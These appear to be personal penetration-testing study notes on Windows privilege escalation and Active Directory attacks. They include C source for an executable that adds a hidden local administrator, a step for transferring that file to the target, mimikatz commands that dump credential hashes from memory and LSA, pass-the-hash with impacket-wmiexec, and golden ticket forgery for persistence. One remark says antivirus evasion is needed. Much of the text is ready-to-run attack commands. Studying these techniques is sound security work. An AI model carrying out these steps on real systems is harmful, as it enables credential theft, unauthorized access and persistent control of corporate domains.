In windows you can always check with -WhatIf  COMMAN in powershell like "Restart-Computer -WhatIf"

in CMD
$ hostname
$ whoami    #if domain before \username is different that hostname, its AD account.
$ net user  #Shows local users on pc
$ whoami /groups  #overview of domain and local groups this user is.   IBM\Marketing   Group     S-1-5-21-4002288239-111288127-1231543-9402
                                                                     domain\groupname                Security ID                      -9402 is Identifier
$ Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$_.State -like 'Running'}   #See all running services Powershell command.
#Check for LocalSystem, cos of highest priviledges and stay away from System32, look for anomalies - path thats somewhere else.

Enumerate binaries that you found with ICACLS - Integrity Access Control Access Lists. It used to enumerate access control list on binary or folder.
$ icacls "C:\Program Files (x86)\Common Files\Zoom\Support\Service.exe"
We look for some binary where   BUILTIN\Users:(I)(RX) is (F)  F - means full access  (I) - means its Inheriting access from parents folder rights
Also check services start mode!
$ Get-CimInstance -ClassName Win32_Service -Filter "Name= 'mysql'" | Select-Object StartMode         #specific service
$ Get-CimInstance -ClassName Win32_Service | Select-Object Name, StartMode                           #all services


Create .exe on Kali that adds local admin to machine.
----------------------------------------------------------
#include <stdlib.h>
int main ()
{
  int i;
  i = system ("net user mighty password123! /add");
  i = system ("net localgroup administrators mighty /add");
  return 0;
}
----------------------------------------------------------

Run compiler command on Kali to compile this C program to exe file.
$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe    #adduser.c is our name of prog to add user and output is .exe. In Kali
Start web server and get file from Kali to Win
$ python3 -m http.server 80                                      #Kali
$ iwr -Uri http://192.168.1.47/adduser.exe -OutFile adduser.exe  #windows

$ whoami /priv     #shows the security privileges for the current logged-in user.


N  T   M    L
----------------------
NTML is not so safe than Kerberos, if AD has NTML its vulnerability, but as NTML works with older apps, so its there :)
If you get NTML hash for user, you can use that hash (pass the hash attack) instead of password and use the hash to authenticate.

Michael logs in with his acc and pw, client will calculate its NTML hash based on the password and is gonna be stored in memory of the client. Client is gonna then send username to the something, where Michael wants to connect. something gonna response with challenge - random value, client is gonna receive chanllenge and encrypt it using NTML hash, that is based on Michaels password and send it back - this is know as response. Then something where Michael wants to log is gonna receive this response and forward 1.) response and 2.) username and 3.) challenge to the Domain controller or DC, and DC looks for its NTML hash for Michael and encrypt challenge itself, then compare result with "response".


K  E  R  B  E  R  O  S
------------------------
Kerberos issue tickets and use for authentication. Client logs in with acc and pasw and sends authentication server request ASReq to KDC or key distribution center (Which in most cases runs on domain controller). This request contains timestamp, that is encrypted using hash that is derived from users password. Then Domain Controller that have access to all the password hashes, will try to decrypt timestamp with its version of user hash and if those are matching auth happens and Domain controller sends reply to client with ASRep (Authentication server reply). And THIS CONTAINS JUICY INFO we are after - session key and ticket granting ticket. session key is encrypted with users password, but tgt itself also contains interesting info about user, such as username, what groups user have access to, like if you are domain admin etc. And TGT is encrypted using secret key, which is the NTML hash for the krbtgt account! Thats superimportant account in AD!
After this client or user shows the ticket to KDC whenever need access to the resource.

Example Michael logs in Domain and then RDP to another machine. At RDP that moment Michaels computer gonna send "Ticket granting service" to the KDC requesting service ticket. KDC then is gonna verify TGT if its valid, and if its valid KDC gonna send service ticket back to Michaels pc. And then Michaels pc gonna send this ticket to something where he wants to log in, something gonna decrypt the ticket, verifies access permissions and let him log in.


If user authenticate to IP address instead of hostname then automatically NTML authentication is used.
If user authenticates with hostname that is not registred in AD integrated DNS server, then NTML is used.
3rd party apps often use NML as well.


Start to use mimikatz, but AV will cath this obfuscation course is needed. Fantastic tool for AD pentesting.

$ mimikatz # privilege::debug              #first to check if we can run process "Priviledge '20' OK"
$ mimikatz # sekurlsa::logonpasswords      #Tapping into LSA (Local security authority) process to check if NTML hashes are saved in memory.
Attacker waits when someone logs in to get their NTML hash!

On Kali:
$ /usr/bin/impacket-wmiexec -hashes :ar545hjfjans353535NTMLhashfromprevious domain/username@ip (sedocorp/bob@192.168.144.144)
Example: $ /usr/bin/impacket-wmiexec -hashes :a57b67b0bfe5dbd258226194f0caf201 corp/mary@192.168.1.41

#Also sometimes we need port 135 to be open on target! Also we need to be local administrator on the machine! 

#impacket-wmiexec alternatives - EvilWinRM, mimikatz, crackmapexec, Metasploit.

# # # #  WHEN WE IN SYSTEM # # # # # 

$cd appdata\roaming\microsoft\windows\powershell\psreadline    #ConsoleHost_history.txt
$ type ConsoleHost_history.txt

# # # # # We want persistance to come back later If we had domain admin # # # # # 
If you add new admin user that can be seen. What we are gonna do is to forge ticket a TGT. we are not going to use the KDC or Kerberos logging or anything for this. we are gonna fake this ourselves.
This TGT is gonna appeared to be signed by domains Legitimate KDC itself and we are gonna encrypt the ticket with a krbtgt password hash, which is used when login in domain with kerberous.
We need:
1.) domain SID
2.) krbtgt password hash

First download mimikatz
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch    #as domain controller this is gonna dump whole lsa. We will get every single user hash including krbtgt
                                  # /patch is going to inject a dll into the LSUS process, its gonna hook and modify certain functions and
                                  #allow mimikatz to read the hashes with out access restrictions, trigering errors

After krbtgt hash you can login with simple low priviledged user and not needed, but purge all kerberos tickets:
mimikatz # kerberos::purge    #now we have 0 tickets
mimikatz # kerberos::golden /user:michael        #For this we need legitimate user in domain, since July 2022 you need valid user in domain before u didnt.
                            /domain:corp.com  #Domain
                            /sid:S-1-5-21-4002288239-111288127-1231543-9402   #Domain SID
                            /krbtgt:7b67b0bfe5dbd258226194f0caf20             #krbtgt hash
                            /ppt #to pass the ticket in current session! or /ticket:ticket_name_random  #generate file with a ticket that we can store
THAT ALL is in 1 line! divided by space of course each from other






























